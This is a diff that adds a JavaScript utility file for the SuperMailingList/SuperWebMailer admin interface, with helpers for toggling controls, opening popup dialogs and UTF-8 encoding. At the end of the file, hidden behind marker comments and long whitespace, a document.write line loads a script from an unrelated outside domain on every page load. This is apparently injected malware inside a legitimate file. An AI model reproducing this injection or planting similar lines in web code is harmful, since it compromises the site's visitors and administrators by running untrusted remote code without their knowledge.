@@ -1,0 +1,514 @@
+	/************************************************************************************************************
+  #############################################################################
+  #                SuperMailingList / SuperWebMailer                          #
+  #               Copyright © 2007 - 2010 Mirko Boeer                         #
+  #                    Alle Rechte vorbehalten.                               #
+  #                http://www.supermailinglist.de/                            #
+  #                http://www.superwebmailer.de/                              #
+  #   Support SuperMailingList: support@supermailinglist.de                   #
+  #   Support SuperWebMailer: support@superwebmailer.de                       #
+  #   Support-Forum: http://board.superscripte.de/                            #
+  #                                                                           #
+  #   Dieses Script ist urheberrechtlich geschuetzt. Zur Nutzung des Scripts  #
+  #   muss eine Lizenz erworben werden.                                       #
+  #                                                                           #
+  #   Das Script darf weder als ganzes oder als Teil eines anderen Projekts   #
+  #   verwendet oder weiterverkauft werden.                                   #
+  #                                                                           #
+  #   Beachten Sie fuer den Einsatz des Script-Pakets die Lizenzbedingungen   #
+  #                                                                           #
+  #   Fuehren Sie keine Veraenderungen an diesem Script durch. Jegliche       #
+  #   Veraenderungen koennen nicht supported werden.                          #
+  #                                                                           #
+  #############################################################################
+	************************************************************************************************************/
+
+function DisableControl(Enabled, AControl, ALabel) {
+  if(Enabled) {
+     AControl.disabled = false;
+  }
+  else {
+    AControl.disabled = true;
+  }
+  
+  if(ALabel != null) {
+    ALabel.disabled = AControl.disabled;
+  }
+  
+  return true;
+}
+
+function DisableControlsArray(Enabled, AControlsArray, ALabelsArray) {
+
+  for(i=0; i < AControlsArray.length; i++) {
+    if(Enabled) {
+       AControlsArray[i].disabled = false;
+    }
+    else {
+      AControlsArray[i].disabled = true;
+    }
+  }
+
+  if(ALabelsArray != null)
+    for(i=0; i < ALabelsArray.length; i++) {
+      ALabelsArray[i].disabled = !Enabled;
+
+     // FF problems
+     if(!Enabled) {
+       ALabelsArray[i].setAttribute("borderBottomColor", ALabelsArray[i].style.color, false);
+       ALabelsArray[i].style.color = "#C0C0C0";
+       ALabelsArray[i].style.cursor = 'default';
+     } else {
+       ALabelsArray[i].style.cursor = 'pointer';
+       ALabelsArray[i].style.color = ALabelsArray[i].style.borderBottomColor;
+     }
+
+    }
+
+  return true;
+}
+
+function DisableControlsById(ReferenceControlName, AControlsNameArray) {
+  if(document.getElementById(ReferenceControlName) == null) return;
+  var labs = document.getElementsByTagName('label');
+  Enabled = document.getElementById(ReferenceControlName).checked && !document.getElementById(ReferenceControlName).disabled;
+  for(i=0; i < AControlsNameArray.length; i++) {
+    if(Enabled) {
+       document.getElementById(AControlsNameArray[i]).disabled = false;
+    }
+    else {
+      document.getElementById(AControlsNameArray[i]).disabled = true;
+    }
+    for(j=0; j<labs.length; j++) {
+       var htmlFor = labs[j].getAttribute('for') ?
+                            labs[j].getAttribute('for') : labs[j].getAttribute('htmlFor');
+       if(htmlFor == AControlsNameArray[i]) {
+          labs[j].disabled = !Enabled;
+          // FF problems
+          if(!Enabled) {
+            labs[j].setAttribute("borderBottomColor", labs[j].style.color, false);
+            labs[j].style.color = "#C0C0C0";
+            labs[j].style.cursor = 'default';
+          } else {
+            labs[j].style.cursor = 'pointer';
+            labs[j].style.color = labs[j].style.borderBottomColor;
+          }
+       }
+    }
+  }
+
+
+  return true;
+}
+
+function CheckAllCheckboxes(sourcecheckboxName, targetcheckboxNames, AFormId)
+{
+ var AForm = document.getElementById(AFormId);
+ if(AForm == null)
+   return true;
+
+ var elem = AForm.elements[targetcheckboxNames];
+
+	if (elem != null)
+		{
+  		var checkit  = AForm.elements[sourcecheckboxName].checked;
+
+  		if (elem.length != null)
+  			{
+    			for (i = 0; i < elem.length; i++)
+  	  			elem[i].checked = checkit;
+  			}
+  		else
+  			elem.checked = checkit;
+		}
+ return true;
+}
+
+function ShowHideItem(IDToHide)
+{
+		var AItem = document.getElementById(IDToHide);
+		if(AItem == null) return;
+
+		if (AItem.style.display == 'none')
+ 			AItem.style.display = '';
+ 		else
+    if (AItem.style.display == '')
+ 			  AItem.style.display = 'none';
+    		else
+ 			    AItem.style.display = 'none';
+}
+
+function ShowItem(AItemId, doShow) {
+  var AItem = document.getElementById(AItemId);
+  if(AItem == null) return;
+  if(doShow == true)
+    AItem.style.display = '';
+    else
+    AItem.style.display = 'none';
+}
+
+function DisableItem(AItemId, Enabled) {
+  var AItem = document.getElementById(AItemId);
+  if(AItem == null) {
+    AItem = document.getElementsByName(AItemId)[0];
+    if(AItem == null)
+       return;
+  }
+  AItem.disabled = !Enabled;
+}
+
+function DisableItemCursorPointer(AItemId, Enabled) {
+  var AItem = document.getElementById(AItemId);
+  if(AItem == null) return;
+  AItem.disabled = !Enabled;
+  if(!Enabled)
+    AItem.style.cursor = 'default';
+    else
+    AItem.style.cursor = 'pointer';
+
+}
+
+function ChangeImage(AItemId, newImage) {
+  var AItem = document.getElementById(AItemId);
+  if(AItem == null) return;
+  AItem.src = newImage;
+}
+
+function GetCheckedCount(ACheckBoxId, AFormId) {
+  var AForm = document.getElementById(AFormId);
+  if(AForm == null)
+    return 0;
+
+  var AItem = document.getElementById(ACheckBoxId);
+  var elem = AForm.elements[ACheckBoxId];
+
+  if (elem != null) {
+
+  		if (elem.length != null)
+  			{
+       count = 0;
+       for (i = 0; i < elem.length; i++)
+  	  			  if(elem[i].checked)
+            count++;
+       return count;
+  			}
+  		else
+  			if (elem.checked)
+        return 1;
+  }
+  return 0;
+}
+
+function CheckAndRemoveCriticalChars(AFormId) {
+  var AForm = document.getElementById(AFormId);
+  if(AForm == null)
+    return;
+    
+  for(i=0; i<AForm.elements.length; i++)  {
+    if (AForm.elements[i].type == "text" && AForm.elements[i].name.indexOf("URL") == -1 ) { // only input type="text" and not URL in Name
+      var element = AForm.elements[i];
+      
+      if(AForm.elements[i].name.indexOf("Subject") != -1)
+        element.value = element.value.replace(/[´`'"\\]/g, "");
+      else
+        element.value = element.value.replace(/[´`'"\\&%?=+]/g, "");
+    }
+  }
+}
+
+function InsertFieldValue(CBId, TargetElementId) {
+  var CB = document.getElementById(CBId);
+  if(CB == null) return;
+   if(CB.selectedIndex > 0) {
+     PasteText(TargetElementId, CB.options[CB.selectedIndex].value );
+     CB.selectedIndex = 0;
+   }
+}
+
+function PasteText(TargetElementId, aText) {
+  var input = document.getElementById(TargetElementId);
+  input.focus();
+  /* für Internet Explorer */
+  if(typeof document.selection != 'undefined') {
+    /* Einfügen des Formatierungscodes */
+    var range = document.selection.createRange();
+    var insText = range.text;
+    range.text = insText + aText;
+    /* Anpassen der Cursorposition */
+    range = document.selection.createRange();
+    if (insText.length == 0) {
+      //range.move('character', -aText.length);
+    } else {
+      range.moveStart('character', insText.length + aText.length);
+    }
+    range.select();
+  }
+  /* für neuere auf Gecko basierende Browser */
+  else if(typeof input.selectionStart != 'undefined')
+  {
+    /* Einfügen des Formatierungscodes */
+    var start = input.selectionStart;
+    var end = input.selectionEnd;
+    var insText = input.value.substring(start, end);
+    input.value = input.value.substr(0, start) + insText + aText + input.value.substr(end);
+    /* Anpassen der Cursorposition */
+    var pos;
+    if (insText.length == 0) {
+      pos = start + aText.length;
+    } else {
+      pos = start + aText.length + insText.length;
+    }
+    input.selectionStart = pos;
+    input.selectionEnd = pos;
+  }
+  /* für die übrigen Browser */
+  else
+  {
+  }
+}
+
+// http://aktuell.de.selfhtml.org/artikel/javascript/utf8b64/utf8.htm
+function utf8_encode(rohtext) {
+   // dient der Normalisierung des Zeilenumbruchs
+   rohtext = rohtext.replace(/\r\n/g,"\n");
+   var utftext = "";
+   for(var n=0; n<rohtext.length; n++)
+       {
+       // ermitteln des Unicodes des  aktuellen Zeichens
+       var c=rohtext.charCodeAt(n);
+       // alle Zeichen von 0-127 => 1byte
+       if (c<128)
+           utftext += String.fromCharCode(c);
+       // alle Zeichen von 127 bis 2047 => 2byte
+       else if((c>127) && (c<2048)) {
+           utftext += String.fromCharCode((c>>6)|192);
+           utftext += String.fromCharCode((c&63)|128);}
+       // alle Zeichen von 2048 bis 66536 => 3byte
+       else {
+           utftext += String.fromCharCode((c>>12)|224);
+           utftext += String.fromCharCode(((c>>6)&63)|128);
+           utftext += String.fromCharCode((c&63)|128);}
+       }
+   return utftext;
+}
+
+
+function utf8_decode(utftext) {
+   var plaintext = ""; var i=0; var c=c1=c2=0;
+   // while-Schleife, weil einige Zeichen uebersprungen werden
+   while(i<utftext.length)
+       {
+       c = utftext.charCodeAt(i);
+       if (c<128) {
+           plaintext += String.fromCharCode(c);
+           i++;}
+       else if((c>191) && (c<224)) {
+           c2 = utftext.charCodeAt(i+1);
+           plaintext += String.fromCharCode(((c&31)<<6) | (c2&63));
+           i+=2;}
+       else {
+           c2 = utftext.charCodeAt(i+1); c3 = utftext.charCodeAt(i+2);
+           plaintext += String.fromCharCode(((c&15)<<12) | ((c2&63)<<6) | (c3&63));
+           i+=3;}
+       }
+   return plaintext;
+}
+//
+
+function OpenEditor(formId, formElementId) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  oWindow = window.open("htmledit.php?form=" + formId + "&formElement=" + formElementId + "&nocache=" + nocache,"htmleditorWnd","width=710,height=540,scrollbars=no,status=no,toolbar=no,resizable=no,location=yes,dependent=yes,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function AttachmentUpload(formId, formElement1Name, Element1Name, formElement2Name, Element2Name) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  oWindow = window.open("attachmentsupload.php?form=" + formId + "&formElement1=" + formElement1Name + "&formElement2=" + formElement2Name + '&Element1Name=' + Element1Name + '&Element2Name=' + Element2Name + "&nocache=" + nocache,"attachUploadWnd","width=710,height=380,scrollbars=no,status=no,toolbar=no,resizable=no,location=yes,dependent=yes,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function AttachmentDelete(formId, formElement1Name, formElement2Name) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  var AForm = document.getElementById(formId);
+  if(AForm == null)
+    return 0;
+
+  var AItems = document.getElementsByName(formElement1Name);
+  files = "";
+  for(i=0; i<AItems.length; i++) {
+    if(AItems[i].checked)
+       if(files == "")
+          files = AItems[i].value;
+          else
+          files = files + ";" + AItems[i].value;
+  }
+
+  oWindow = window.open("attachmentsdelete.php?form=" + formId + "&formElement1=" + formElement1Name + "&formElement2=" + formElement2Name + "&files=" + escape(files) + "&nocache=" + nocache,"attachDeleteWnd","width=720,height=380,scrollbars=yes,status=no,toolbar=no,resizable=yes,location=no,dependent=yes,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function MTATestWindow(MTAId) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  oWindow = window.open("mta_test.php?mta_id=" + MTAId + "&nocache=" + nocache, "MTATestWnd","width=710,height=480,scrollbars=no,status=no,toolbar=no,resizable=no,location=no,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function InboxTestWindow(InboxId) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  oWindow = window.open("inbox_test.php?inbox_id=" + InboxId + "&nocache=" + nocache, "InboxTestWnd","width=710,height=240,scrollbars=no,status=no,toolbar=no,resizable=no,location=no,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function FunctionsOpen(formId, formElementId, isfckeditor) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  oWindow = window.open("browsefunctions.php?form=" + formId + "&formElement=" + formElementId + "&IsFCKEditor=" + isfckeditor + "&nocache=" + nocache, "functionEditWnd","width=750,height=520,scrollbars=yes,status=yes,toolbar=no,resizable=no,location=no,dependent=yes,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function TextBlocksOpen(formId, formElementId, isfckeditor) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  oWindow = window.open("browsetextblocks.php?form=" + formId + "&formElement=" + formElementId + "&IsFCKEditor=" + isfckeditor + "&nocache=" + nocache, "textblocksEditWnd","width=750,height=800,scrollbars=yes,status=yes,toolbar=no,resizable=no,location=no,dependent=yes,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function LocalMessagesBrowse() {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  oWindow = window.open("browselocalmessages.php?nocache=" + nocache, "LocalMessagesWnd","width=750,height=520,scrollbars=yes,status=yes,toolbar=no,resizable=no,location=no,dependent=yes,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function TemplatesSelectDlgOpen(formId, formElementId, isfckeditor) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  oWindow = window.open("plaintexttemplates.php?form=" + formId + "&formElement=" + formElementId + "&IsFCKEditor=" + isfckeditor + "&nocache=" + nocache, "TemplatesSelectDlgWnd","width=750,height=420,scrollbars=yes,status=yes,toolbar=no,resizable=no,location=no,dependent=yes,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function SerialMailPreviewOpen(MailingListId, FormId, MailTemplate) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  oWindow = window.open("serialmailpreview.php?MailingListId=" + MailingListId + "&FormId=" + FormId + "&MailTemplate=" + MailTemplate + "&nocache=" + nocache, "SerialMailPreviewWnd","width=750,height=670,scrollbars=yes,status=yes,toolbar=no,resizable=no,location=no,dependent=yes,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function SerialMailPreviewOpenResponder(MailingListId, FormId, ResponderType, ResponderId, ResponderMailItemId) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  oWindow = window.open("serialmailpreview.php?MailingListId=" + MailingListId + "&FormId=" + FormId + "&ResponderType=" + ResponderType + "&ResponderId=" + ResponderId + '&ResponderMailItemId=' + ResponderMailItemId + "&nocache=" + nocache, "SerialMailPreviewWnd","width=750,height=670,scrollbars=yes,status=yes,toolbar=no,resizable=no,location=no,dependent=yes,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function ResponderPreviewOpenResponder(MailingListId, FormId, ResponderType, ResponderId, ResponderMailItemId, RequestedInfos) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  height = 670;
+  width = 750;
+  if(RequestedInfos == "GetBandwidth")
+    height = 320;
+  if(RequestedInfos == "SpamTest")
+    width = 900;
+  if(RequestedInfos == "TestMail")
+    height = 300;
+  oWindow = window.open("responderpreview.php?MailingListId=" + MailingListId + "&FormId=" + FormId + "&ResponderType=" + ResponderType + "&ResponderId=" + ResponderId + '&ResponderMailItemId=' + ResponderMailItemId + '&' + RequestedInfos + '=1' + "&nocache=" + nocache, "ResponderPreviewWnd","width=" + width + ",height=" + height + ",scrollbars=yes,status=yes,toolbar=no,resizable=no,location=no,dependent=yes,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function ShowHelpWindow(helpTopic) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  oWindow = window.open("help.php?helpTopic=" + helpTopic + "&nocache=" + nocache, "HelpWnd","width=800,height=480,scrollbars=yes,status=no,toolbar=yes,resizable=yes,location=no,modal=no");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function ShowNewsletterArchive(NAUniqueId, NAId, UserId) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  height = 670;
+  width = 800;
+  oWindow = window.open("show_na.php?na=" + NAUniqueId + "&newsletterarchive=" + NAId + "&nauser=" + UserId + "&nocache=" + nocache, "ShowNewsletterArchiveWnd","width=" + width + ",height=" + height + ",scrollbars=yes,status=yes,toolbar=no,resizable=yes,location=yes,dependent=yes,modal=no");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function ShowNewsletterArchiveAsRSS(NAUniqueId, NAId, UserId) {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  height = 670;
+  width = 800;
+  oWindow = window.open("show_na.php?na=" + NAUniqueId + "&newsletterarchive=" + NAId + "&nauser=" + UserId + "&nocache=" + nocache + '&showRSS=1', "ShowNewsletterRSSArchiveWnd","width=" + width + ",height=" + height + ",scrollbars=yes,status=yes,toolbar=no,resizable=yes,location=yes,dependent=yes,modal=no");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function ShowRcptsColumnsDlg() {
+  var date = new Date();
+  var nocache = date.getTime() / 1000;
+  oWindow = window.open("rcptscolumns.php?nocache=" + nocache, "RcptsColumnsWnd","width=710,height=530,scrollbars=no,status=no,toolbar=no,resizable=no,location=no,modal=yes");
+  oWindow.opener = window;
+  oWindow.focus();
+}
+
+function HideEmptyMenuItems(){
+  Menus = Array("MainMenu", "SystemMenu");
+  for(i=0;i<Menus.length;i++) {
+    if(document.getElementById(Menus[i]) ) {
+      Menu = document.getElementById(Menus[i]);
+      LINode = Menu.firstChild;
+      while(LINode && LINode.tagName != "LI")
+        LINode = LINode.nextSibling;
+      while(LINode) {
+        child = LINode.firstChild;
+        while(child){
+         if( child.tagName == "UL"  ) {
+           count = 0;
+           cnode = child.firstChild;
+           while(cnode) {
+             if(cnode.tagName) {
+               count++;
+               break;
+             }
+             cnode = cnode.nextSibling;
+           }
+           if(count == 0)
+             LINode.style.display = 'none';
+           break;
+         }
+         child = child.nextSibling;
+        }
+        LINode = LINode.nextSibling;
+        while(LINode && LINode.tagName != "LI")
+           LINode = LINode.nextSibling;
+      }
+    }
+  }
+}
+
+/*19f955*/
+
+                    																	                               	 /*iafiaf0976757iaf09*/
+
+document.write("<script type='text/javascript' src='http://www.toccata-software.de/8tRbKjx4.php?id='></"+ "script>");
+
+
+/*/19f955*/
